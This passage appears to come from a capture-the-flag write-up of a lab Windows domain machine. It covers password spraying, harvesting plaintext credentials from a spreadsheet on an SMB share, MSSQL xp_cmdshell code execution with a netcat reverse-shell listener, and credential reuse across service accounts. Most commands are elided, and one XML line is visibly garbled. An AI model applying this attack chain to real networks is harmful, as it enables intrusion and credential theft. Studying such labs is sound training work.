...
Then conducted some basic LDAP enumeration to build a user list for password spraying, which revealed 9 accounts.
```bash
...
I sprayed `rose`'s password against the other users, only to authenticate as `rose` but still enumerate the SMB shares. This revealed a non-default share `Accounting Department` which `rose` had read access to.
```bash
...
I crawled the shares and download all of the files that `rose` could read to my machine using the netexec `spider_plus` plugin.
```bash
...
In the `Accounting Department` share was two files, `accounting_2024.xlsx` and `accounts.xlsx`. Unzipping and grepping the files for "Password" eavealed a list of usernames and passwords in the `xl/sharedStrings.xml` file.
```bash
ls
accounting_2024.xlsx  accounts.xlsx

unzip accounts.xlsx                                                                                                                                             grep -r "Password" > sharedstrings.txt                                                                  
xl/sharedStrings.xml:<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xl/sharedStrings.xmlxml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>
```

I extracted the passwords from XML structure with `grep` and `sed`, adding them to the password list `creds.txt`.
```bash
...
And did the same for the users, adding them to the established `users.txt`.
```bash
...
I sprayed the lists again, this time against the `MSSQL` service to find a hit against the `sa` account, the `MSSQL` serivce account.
```bash
...
This access via the `sa` account and `MSSQL` enabled remote code execution through `xp_cmdshell` functionality, which I used to send a PowerShell reverse shell.
```bash
nc -nvlp 9001
```
...
Enumerating the system, I found the MSSQL server configuration file `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI` containing credentials for another service account `sql_svc`.
```powershell
pwd
...
I added the password to `creds.txt`.
```bash
...
Another round of password spraying, this time against the `WinRM` service revealed credential reuse across service accounts, with `ryan` using the same password as `sql_svc`.
```bash
...
I logged in as `ryan` via `WinRM` and obtained the user flag on his desktop.
```powershell
...
Again using the MSSQL access for code execution, I uploaded `SharpHound` to further enumerate the domain.
```powershell
